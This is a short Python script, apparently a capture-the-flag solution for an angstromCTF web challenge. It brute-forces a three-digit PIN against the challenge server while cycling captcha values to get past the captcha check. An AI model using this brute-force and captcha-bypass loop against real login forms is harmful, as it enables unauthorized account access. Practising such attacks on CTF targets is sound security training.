#!/usr/bin/env python3
import requests

SITE = "http://web.angstromctf.com:1342/"
MAX_CAPTCHA_NO = 10

pin = 611
captcha_no = 0

win = False
while not win:
	r = requests.post(SITE,
		data={
			'question1': captcha_no, 
			'pin': "%03d" % pin
		})
	reply = r.text

	if "Bad captcha!" in reply:
		if captcha_no > MAX_CAPTCHA_NO:
			captcha_no = 0
		else: 
			captcha_no += 1
		print(".", end="")
	elif "Wrong pin!" in reply:
		pin += 1
		print("Trying next pin %03d" % pin)
		win = False
	else:
		print("Win!")
		print(reply)
		win = True